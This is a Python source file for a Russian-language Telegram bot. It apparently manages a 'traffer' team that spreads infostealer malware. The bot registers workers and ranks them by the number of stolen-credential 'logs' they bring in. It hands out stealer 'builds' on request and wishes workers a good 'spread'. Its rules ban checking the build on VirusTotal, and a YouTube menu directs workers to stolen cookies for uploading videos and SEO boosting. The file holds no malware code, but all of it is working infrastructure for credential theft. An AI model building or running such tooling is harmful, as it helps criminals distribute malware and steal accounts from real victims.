# -*- coding: utf8 -*-
import config
import telebot
import sqlite3
import datetime
from datetime import *
import os
import time as t

buttons_start = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
profile = telebot.types.KeyboardButton("🧑‍💻 Профиль")
top = telebot.types.KeyboardButton("🎖 Топ")
settings = telebot.types.KeyboardButton("⚙️ Информация")
request = telebot.types.KeyboardButton("🦠 Запросить билд")
yt = telebot.types.KeyboardButton("📹 YT Панель")
buttons_start.row(profile, top, settings)
buttons_start.row(yt)
buttons_start.row(request)

buttoninline_setting = telebot.types.InlineKeyboardMarkup()
chatlink = telebot.types.InlineKeyboardButton(text='💬 Чат воркеров', url=config.chatlink)
manuallink = telebot.types.InlineKeyboardButton(text='📚 Мануалы', url=config.manuallink)
otstuklink = telebot.types.InlineKeyboardButton(text='🛠 Отстук', url=config.otstuklink)
rules = telebot.types.InlineKeyboardButton(text='📜 Правила', callback_data='rules')
buttoninline_setting.row(chatlink, otstuklink)
buttoninline_setting.row(manuallink)
buttoninline_setting.row(rules)

paymantagree = telebot.types.InlineKeyboardMarkup()
paymentsuccess = telebot.types.InlineKeyboardButton(text='Выплачено', callback_data='paymentsuccess')
paymantagree.row(paymentsuccess)

startrega_button = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
startrega = telebot.types.KeyboardButton('Подать заявку')
startrega_button.row(startrega)

buttoninline_del = telebot.types.InlineKeyboardMarkup()
agreedel = telebot.types.InlineKeyboardButton(text='Я уверен', callback_data='agreedel')
declinedel = telebot.types.InlineKeyboardButton(text='Отмена', callback_data='declinedel')
buttoninline_del.row(agreedel, declinedel)

bot = telebot.TeleBot(config.token)
print('Бот включен! '+str(datetime.now()))

db = sqlite3.connect('database.db', check_same_thread=False)
sql = db.cursor()
print('База данных подключена! '+ str(datetime.now()))

sql.execute("""CREATE TABLE IF NOT EXISTS users (
	id INT PRIMARY KEY,
	login TEXT,
	fname TEXT,
	alllogs INT,
	datereg TEXT,
	status INT
)""")

sql.execute("""CREATE TABLE IF NOT EXISTS infoteam (
	numbers INT PRIMARY KEY,
	alllogsteam INT,
	dateopenteam TEXT
)""")

sql.execute("SELECT numbers FROM infoteam")
if sql.fetchone() is None:
	dt_now = str(datetime.today().strftime('%d.%m.%Y'))
	sql.execute("INSERT OR IGNORE INTO infoteam VALUES (?, ?, ?)", (0, 0, dt_now))
	db.commit()

@bot.message_handler(commands=['start'])
def send_welcome(message):
	sql.execute("SELECT status FROM users WHERE id = ?", (message.chat.id, ))
	if str(sql.fetchall()) == '[]':
		bot.send_message(message.chat.id,'💸 Добро пожаловать! Ты можешь подать заявку.', reply_markup=startrega_button)
	else:
		sql.execute("SELECT status FROM users WHERE id = ?", (message.chat.id, ))
		stwork = sql.fetchall()[0][0]
		if stwork == 999:
			bot.send_message(message.chat.id,'Твоя заявка уже на рассмотрении.')
		else:
			bot.send_message(message.chat.id,'Добро пожаловать в команду <b>'+config.team+'</b>!\nИспользуй кнопки ниже для навигации в боте.', parse_mode='HTML', reply_markup=buttons_start)

'''@bot.channel_post_handler(content_types=['text','photo','audio','video','document'])
def posts_from_channels(message):
	if True:
		try:
			messtext = str(message.caption).split('\n')
			first_text = messtext[0].split()
			print(first_text)
			if first_text[0] == '🔥 In panel new log!':
				print(messtext)
				kogoLog = messtext[1].split(' ')
				kogoLog = str(kogoLog[1]).replace("@", "")
				sql.execute("SELECT id FROM users WHERE login=?", (kogoLog, ))
				workerid = sql.fetchall()
				print(workerid)
				sql.execute("UPDATE users SET alllogs=alllogs+1 WHERE login=?", (kogoLog, ))
				sql.execute("UPDATE infoteam SET alllogsteam=alllogsteam+?", (1))
				db.commit()
				bot.forward_message(int(workerid[0][0]), message.chat.id, message.message_id)
				print('[+] SUCCESS SEND LOG!')



		except:
			print('[-] ERROR SEND LOG')
'''
@bot.message_handler(commands=['sendbuild'])
def send_seestat(message):
	try:
		sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
		if sql.fetchall()[0][0] == 1:
			try:
				global workeridbuild
				workeridbuild = message.text[message.text.find(' '):]
				try:
					bot.send_message(int(workeridbuild), '📦 Билд готов, вскоре бот отправит его тебе.')
					a = bot.send_message(message.chat.id,'Отправь билд воркера 👇')
					bot.register_next_step_handler(a, sendbuilddef)
				except:
					bot.send_message(message.chat.id,'⚠️ Айди воркера не верный ⚠️\n<i>(не верный айди, воркер заблокировал бота)</i>', parse_mode='HTML')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['seestat'])
def send_seestat(message):
	try:
		sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
		if sql.fetchall()[0][0] == 1:
			try:
				worker = message.text[message.text.find(' '):]
				sql.execute("SELECT login FROM users WHERE id=?", (int(worker)))
				profilelogin = sql.fetchall()
				sql.execute("SELECT datereg FROM users WHERE id=?", (int(worker)))
				dateregprofile = sql.fetchall()
				sql.execute("SELECT fname FROM users WHERE id=?", (int(worker)))
				fnameprofile = sql.fetchall()
				sql.execute("SELECT alllogs FROM users WHERE id=?", (int(worker)))
				alllogs = sql.fetchall()
				if alllogs[0][0] >= 200:
					rang = 'Гуру'
				elif alllogs[0][0] >= 100:
					rang = 'Трафф-Машина'
				elif alllogs[0][0] >= 20:
					rang = 'Воркер'
				elif alllogs[0][0] <= 20:
					rang = 'Новобранец'
				bot.send_message(message.chat.id,'<b>🧑‍💻 Профиль</b>\n\n💾 Логин в БД: <b>@'+str(profilelogin[0][0])+'</b>\n\n💉 Всего логов: <b>'+str(alllogs[0][0])+'</b>\n🎖 Ранг: <b>'+rang+'</b>\n\n📆 Ты с нами с: <b>'+str(dateregprofile[0][0])+'</b>', parse_mode='HTML')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['advert'])
def send_advert(message):
	try:
		sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
		if sql.fetchone()[0] == 1:
			textmessage = message.text[message.text.find(' '):]
			sql.execute("SELECT * FROM users")
			records = sql.fetchall()
			amountsend = 0
			amounterror = 0
			for row in records:
				try:
					bot.send_message(row[0], textmessage, parse_mode='HTML')
					amountsend = amountsend+1
				except:
					amounterror = amounterror+1
			bot.send_message(message.chat.id,'✅ Рассылка завершена!\nСообщение получило: <b>'+str(amountsend)+' юзера</b>\nНе получило: <b>'+str(amounterror)+' юзера</b>', parse_mode='HTML')
		else:
			pass
	except:
		pass
@bot.message_handler(commands=['setstatus'])
def send_setstatus(message):
	try:
		data = message.chat.id
		if data == -1001673214879 or message.chat.id == 1361816235:
			try:
				iduser = message.text[message.text.find(' '):]
				iduser = iduser.rpartition(':')[0]  
				idstatus = message.text[message.text.find(':'):]
				idstatus = idstatus.replace(':','')
				if message.from_user.id == 5394800456:
					if int(idstatus) != 0:
						bot.send_message (message.chat.id, 'Вам запрещено менять статус')
					else:
						sql.execute("UPDATE users SET status=? WHERE id=?", (idstatus, iduser, ))
						db.commit()
						bot.send_message(message.chat.id,'Статус пользователя изменён!')
						stat = '⛏ Воркер'
						bot.send_message(int(iduser),'<b>⚠️ Ваш статус изменён! ⚠️</b>\nВаш новый статус: <b>'+stat+'</b>\n\nЧат: '+config.chatlink+'\nОтстук: '+config.otstuklink, parse_mode='HTML', reply_markup=buttons_start)
						return
				else:
					sql.execute("UPDATE users SET status=? WHERE id=?", (idstatus, iduser, ))
					db.commit()
					bot.send_message(message.chat.id,'Статус пользователя изменён!')
					if int(idstatus) == 0:
						stat = '⛏ Воркер'
						bot.send_message(int(iduser),'<b>⚠️ Ваш статус изменён! ⚠️</b>\nВаш новый статус: <b>'+stat+'</b>\n\nЧат: '+config.chatlink+'\nОтстук: '+config.otstuklink, parse_mode='HTML', reply_markup=buttons_start)
						return
					elif int(idstatus) == 1:
						stat = '🔴 Администратор'
					elif int(idstatus) == 2:
						stat = '🕺 Саппорт'
					elif int(idstatus) == 3:
						stat = '⛔️ Заблокирован'
					elif int(idstatus) == 4:
						stat = '🔮 Инсталлер'
					bot.send_message(int(iduser),'<b>⚠️ Ваш статус изменён! ⚠️</b>\n\nВаш новый статус: <b>'+stat+'</b>', parse_mode='HTML', reply_markup=buttons_start)
			except:
				print('Oshibka')
		else: print("dd")
	except Exception as v:
                raise v
	
@bot.message_handler(commands=['sendmessage'])
def send_sendmessage(message):
	try:
		sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
		if sql.fetchall()[0][0] == 1:
			try:
				iduser = message.text[message.text.find(' '):]
				iduser = iduser.rpartition(':')[0]  
				textmessage = message.text[message.text.find(':'):]
				textmessage = textmessage.replace(':','')
				bot.send_message(int(iduser),textmessage, parse_mode='HTML')
				bot.send_message(message.chat.id,'Сообщение успешно отправлено!')
			except:
				pass
	except:
		pass
@bot.message_handler(commands=['openteam'])
def send_admin(message):
	try:
		sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
		if sql.fetchall()[0][0] == 1:
			bot.send_message(message.chat.id,'<b>😏 Admin-Panel\n\n/sendbuild [ID] - выдать билд через бота\n/seestat [ID] - посмотреть статистику воркера\n/advert [TEXT] (теги: https://telegra.ph/HTML-Tags-06-26)\n/sendmessage [ID WORKER]:[TEXT] - Отправка сообщения воркерку (теги: https://telegra.ph/HTML-Tags-06-26)\n/setstatus [ID WORKER]:[ID STATUS]- Изменить статус юзера (ид статусов: 0 - воркер, 1 - Админ, 2 - Саппорт, 3 - Заблокирован, 4 - Интсаллер (не показывает в топе))</b>', parse_mode='HTML')
		else:
			pass
	except:
		pass
@bot.message_handler(content_types=['text'])
def message(message):
	if message.text == '🎖 Топ':
		try:
			sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
			st = sql.fetchall()[0][0]
			if st == 3 or st == 999:
                                bot.send_message(message.chat.id,'⚠️ <b>Доступ запрещён</b> ⚠️', parse_mode='HTML')
			else:
				top_worker = ""
				users = sql.execute("SELECT * FROM `users` WHERE `status`=0 ORDER BY `alllogs` DESC LIMIT 10").fetchall()
				num = 1
				for user in users:
					top_worker += f"<b>{num}. @{user[1]}</b> - <b>{user[3]}</b> логов\n"
					num = num+1
				bot.send_message(message.chat.id, '<b>🏆 Топ 10 воркеров:</b>\n\n'+top_worker, parse_mode='HTML')
		except:
			pass
	elif message.text == '🧑‍💻 Профиль':
		try:
			sql.execute("SELECT login FROM users WHERE id=?", (message.chat.id, ))
			profilelogin = sql.fetchall()
			sql.execute("SELECT datereg FROM users WHERE id=?", (message.chat.id, ))
			dateregprofile = sql.fetchall()
			sql.execute("SELECT fname FROM users WHERE id=?", (message.chat.id, ))
			fnameprofile = sql.fetchall()
			sql.execute("SELECT alllogs FROM users WHERE id=?", (message.chat.id, ))
			alllogs = sql.fetchall()
			sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = '⛏ Воркер'
			elif st == 1:
				statusprofile = '🔴 Администратор'
			elif st == 2:
				statusprofile = '🕺 Саппорт'
			elif st == 3:
				statusprofile = '⛔️ Заблокирован'
			elif st == 4:
				statusprofile = '🔮 Инсталлер'
			if alllogs[0][0] > 200:
				rang = 'Гуру'
			elif alllogs[0][0] > 100:
				rang = 'Трафф-Машина'
			elif alllogs[0][0] > 20:
				rang = 'Воркер'
			elif alllogs[0][0] < 20:
				rang = 'Новобранец'
			bot.send_message(message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n🎖 Ранг: *'+rang+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown')
		except:
			bot.send_message(message.chat.id,'Тебя похоже нет в нашем боте.. Пропиши /start')
	elif message.text == '⚙️ Информация':
		try:
			sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
			st = sql.fetchall()[0][0]
			if st == 3 or st == 999:
                                bot.send_message(message.chat.id,'⚠️ <b>Доступ запрещён</b> ⚠️', parse_mode='HTML')
			else:
				sql.execute("SELECT alllogsteam FROM infoteam")
				teamlogs = sql.fetchall()[0][0]
				sql.execute("SELECT dateopenteam FROM infoteam")
				dateopen = sql.fetchall()[0][0]
				bot.send_message(message.chat.id,'<b>💁🏼‍♀️ Информация</b> о проекте <b>'+config.team+'</b>\n\n🔥 Мы открылись: <b>'+dateopen+'</b>\n🍂 Количество логов: <b>'+str(teamlogs)+'</b>', parse_mode='HTML', reply_markup=buttoninline_setting)
		except:
			pass
	elif message.text == '🦠 Запросить билд':
                try:
                        sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
                        st = sql.fetchall()[0][0]
                        if st == 3 or st == 999:
                                bot.send_message(message.chat.id,'⚠️ <b>Доступ запрещён</b> ⚠️', parse_mode='HTML')
                        else:
                                try:
                                        bot.send_message(message.chat.id,'🧠 Запрос отправлен администрации. Ожидайте с вами свяжутся.')
                                        bot.send_message(config.amschatid,'<b>Эй, хватит отдыхать 🏖\nНужен стиллер!</b>\n\n🆔 ID: <b>'+str(message.chat.id)+'</b>\n🧑‍💻 Воркер: @'+str(message.from_user.username)+' / '+str(message.chat.id), parse_mode='HTML')
                                except:
                                        pass
                except:
                        bot.send_message(message.chat.id,'Похоже тебя нет в нашем боте.. Пропиши /start')
	elif message.text == '📹 YT Панель':
		buttons_yt = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
		zaliv = telebot.types.KeyboardButton("📹 Залив видео по куки")
		seo = telebot.types.KeyboardButton("😘 Накрутка СЕО")
		cookie = telebot.types.KeyboardButton("🍪 Получить куки")
		info = telebot.types.KeyboardButton("ℹ️ Информация о видео")
		nazad = telebot.types.KeyboardButton("🔙 Назад в меню")
		buttons_yt.row(cookie, zaliv, seo)
		buttons_yt.row(info)
		buttons_yt.row(nazad)
		bot.send_message(message.chat.id, 'Открываю yt панель..', reply_markup = buttons_yt)
	elif message.text == '🔙 Назад в меню':
		buttons_start = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
		profile = telebot.types.KeyboardButton("🧑‍💻 Профиль")
		top = telebot.types.KeyboardButton("🎖 Топ")
		settings = telebot.types.KeyboardButton("⚙️ Информация")
		request = telebot.types.KeyboardButton("🦠 Запросить билд")
		yt = telebot.types.KeyboardButton("📹 YT Панель")
		buttons_start.row(profile, top, settings)
		buttons_start.row(yt)
		buttons_start.row(request)
		bot.send_message(message.chat.id, 'Открываю главное меню..', reply_markup = buttons_start)
	elif message.text == '📹 Залив видео по куки':
		bot.send_message (message.chat.id, '''За заливом видео по куки обратись к @RoltoNn1
Он заливает абсолютно бесплатно для Mint Team с 0 логов''')
	elif message.text == '😘 Накрутка СЕО':
		bot.send_message (message.chat.id, '''За получением сео обратитесь к @RoltoNn1
Он делает сео абсолютно бесплатно для Mint Team с 0 логов''')
	elif message.text == '🍪 Получить куки':
		bot.send_message (message.chat.id, '''За получением куки обратитесь к @RoltoNn1
Он выдает куки абсолютно бесплатно для Mint Team с 0 логов
Чем больше вы принесли логов в тиму, тем лучше выдает кук''')
	elif message.text == 'Подать заявку':
		try:
			sql.execute("SELECT status FROM users WHERE id=?", (message.chat.id, ))
			stwork = sql.fetchall()[0][0]
			if stwork == 999:
				bot.send_message(message.chat.id,'Твоя заявка уже на рассмотрении.')
		except:
			dt_now = str(datetime.today().strftime('%d.%m.%Y'))
			sql.execute(f"INSERT OR IGNORE INTO users VALUES (?, ?, ?, ?, ?, ?)", (message.chat.id, message.from_user.username, message.from_user.first_name, 0, dt_now, 999))
			db.commit()
			a = bot.send_message(message.chat.id,'💁‍♀️ <b>Отлично!</b> Ответь тогда на пару вопросов:\n<b>1.</b> Откуда Вы узнали о нас?\n<b>2.</b> Отправьте ваш ник на форуме / ссылку на ваш профиль\n<b>3.</b> Был ли у вас опыт в данной сфере?\n<b>4.</b> Сколько времени в день Вы будете уделять работе?\n\n<b>(ответь на вопросы одним сообщением)</b>', parse_mode='HTML')
			bot.register_next_step_handler(a, zayvkadef)
def zayvkadef(message):
	bot.send_message(config.amschatid, '📨 <b>Брр.. У нас здесь заявка!</b>\n\n@'+str(message.from_user.username)+':\n<b>'+str(message.text)+'</b>\n\n/setstatus '+str(message.chat.id)+':0 - Принять\n/setstatus '+str(message.chat.id)+':3 - Бан', parse_mode='HTML')
	bot.send_message(message.chat.id,'Заявка отправлена! Жди решения.')
def sendbuilddef(message):
	bot.forward_message(int(workeridbuild), message.chat.id, message.message_id)
	bot.send_message(message.chat.id,'Билд отправлен!')
	bot.send_message(int(workeridbuild), '🍀 Удачного пролива.')
bot.callback_query_handler(func=lambda call: True)
def callback_inline(call):
	if call.data == 'declinedel':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		try:
			sql.execute("SELECT login FROM users WHERE id=?", (call.message.chat.id, ))
			profilelogin = sql.fetchall()
			sql.execute("SELECT datereg FROM users WHERE id=?", (call.message.chat.id, ))
			dateregprofile = sql.fetchall()
			sql.execute("SELECT fname FROM users WHERE id=?", (call.message.chat.id, ))
			fnameprofile = sql.fetchall()
			sql.execute("SELECT alllogs FROM users WHERE id=?", (call.message.chat.id, ))
			alllogs = sql.fetchall()
			sql.execute("SELECT status FROM users WHERE id=?", (call.message.chat.id, ))
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = '⛏ Воркер'
			elif st == 1:
				statusprofile = '🔴 Администратор'
			elif st == 2:
				statusprofile = '🕺 Саппорт'
			elif st == 3:
				statusprofile = '⛔️ Заблокирован'
			elif st == 4:
				statusprofile = '🔮 Инсталлер'
			bot.send_message(call.message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown')
		except:
				pass
	if call.data == 'delinfo':
		bot.send_message(call.message.chat.id,'<b>⚠️ Вы уверены? ⚠️</b>\nУдалится: <b>Всего логов.</b>', parse_mode='HTML', reply_markup=buttoninline_del)
	if call.data == 'agreedel':
		bot.delete_message(call.message.chat.id, call.message.message_id)
		sql.execute("UPDATE users SET alllogs=0 WHERE id=?", (call.message.chat.id, ))
		db.commit()
		bot.send_message(call.message.chat.id,'🎉')
		try:
			sql.execute("SELECT login FROM users WHERE id=?", (call.message.chat.id, ))
			profilelogin = sql.fetchall()
			sql.execute("SELECT datereg FROM users WHERE id=?", (call.message.chat.id, ))
			dateregprofile = sql.fetchall()
			sql.execute("SELECT fname FROM users WHERE id=?", (call.message.chat.id, ))
			fnameprofile = sql.fetchall()
			sql.execute("SELECT alllogs FROM users WHERE id=?", (call.message.chat.id, ))
			alllogs = sql.fetchall()
			sql.execute("SELECT status FROM users WHERE id=?", (call.message.chat.id, ))
			st = sql.fetchall()[0][0]
			if st == 0:
				statusprofile = '⛏ Воркер'
			elif st == 1:
				statusprofile = '🔴 Администратор'
			elif st == 2:
				statusprofile = '🕺 Саппорт'
			elif st == 3:
				statusprofile = '⛔️ Заблокирован'
			elif st == 4:
				statusprofile = '🔮 Инсталлер'
			bot.send_message(call.message.chat.id,'👮‍♂️ С возвращением, *'+str(fnameprofile[0][0])+'* \n\n*🧑‍💻 Профиль*\n\n💾 Логин в БД: *@'+str(profilelogin[0][0])+'*\n\n💉 Всего логов: *'+str(alllogs[0][0])+'*\n\n👤 Статус: *'+statusprofile+'*\n📆 Ты с нами с: *'+str(dateregprofile[0][0])+'*', parse_mode='Markdown')
		except:
			pass
	if call.data == 'rules':
		bot.send_message(call.message.chat.id, """
⚠️ Основные правила команды:

- Запрещено проверять билд на VirusTotal.
- Запрещено передавать билд третьим лицам.
- Запрещено мешать воркерам лить траффик.
- Запрещено вести себя неадекватно в чате.

За нарушение одного из этих правил грозит наказание! 
Уважайте друг друга и занимайтесь соответствующей работой.""", parse_mode='HTML')
	if call.data == 'changelogin':
		try:
			sql.execute("UPDATE users SET login=? WHERE id=?", (call.message.chat.username, call.message.chat.id, ))
			db.commit()
			bot.send_message(call.message.chat.id, 'Ваш логин успешно изменён.')
		except:
			bot.send_message(call.message.chat.id, '🚫 Логин не нуждается в обновлении')
if __name__ == '__main__':
	bot.polling(none_stop=True) 
